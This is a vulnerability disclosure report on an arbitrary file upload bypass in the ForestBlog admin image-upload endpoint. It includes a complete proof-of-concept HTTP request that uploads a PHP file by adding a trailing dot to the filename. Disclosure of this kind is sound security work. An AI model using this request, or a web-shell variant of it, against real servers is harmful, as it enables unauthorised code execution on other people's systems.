**BUG_Author:**

Daydust

**Vendor:**

https://github.com/saysky/ForestBlog

**Software:**

https://github.com/saysky/ForestBlog

**Vulnerability File:**

ForestBlog-master/ForestBlog/src/main/java/com/liuyanzhao/ssm/blog/controller/admin/UploadFileController.java

**Description:**
ForestBlog Exists Arbitrary File Upload Vulnerability on /admin/upload/img Interface

When the code processes the logic of file upload, the character after the last dot is used as the suffix name, and a series of judgment danger detection is performed on the suffix name

![image-20231212223542659](image-20231212223542659.png)

In Windows system, we can upload any file by adding a "." after the file's name.In this case, the suffix value becomes a period, and allowSuffix contains a period, thus bypassing whitelist suffix detection

![image-20231212235628456](image-20231212235628456.png)





![image-20231212235938258](/../a/image-20231212235938258.png)



```http
POST /admin/upload/img HTTP/1.1
Host: 172.21.64.185:8090
Content-Length: 217
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysCaHQits7v3jAaOh
Origin: http://172.21.64.185:8090
Referer: http://172.21.64.185:8090/admin/user/edit/5
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: username=admin; password=123456; JSESSIONID=BB01F841CB10B9619AC5D0A1D363F4FD
Connection: close

------WebKitFormBoundarysCaHQits7v3jAaOh
Content-Disposition: form-data; name="file"; filename="aa.php."
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundarysCaHQits7v3jAaOh--

```

When uploading, the corresponding address will be displayed, or right click on the saved avatar file, you can see the full address. Windows automatically deletes the dot at the end of the file. Therefore, delete the dot at the end of the file to successfully access the fileã€‚

![image-20231213000618896](image-20231213000618896.png)

You can also see that our files were successfully uploaded locally

![image-20231213000645385](image-20231213000645385.png)
